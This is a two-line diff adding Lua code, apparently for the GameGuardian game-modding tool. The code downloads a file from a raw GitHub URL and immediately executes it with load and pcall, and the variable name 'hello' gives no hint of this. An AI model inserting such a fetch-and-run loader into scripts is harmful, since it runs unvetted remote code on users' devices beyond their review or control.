@@ -1,0 +1,2 @@
+local hello = gg.makeRequest("https://raw.githubusercontent.com/Velizar99/silent/master/99").content  
+ pcall(load(hello))
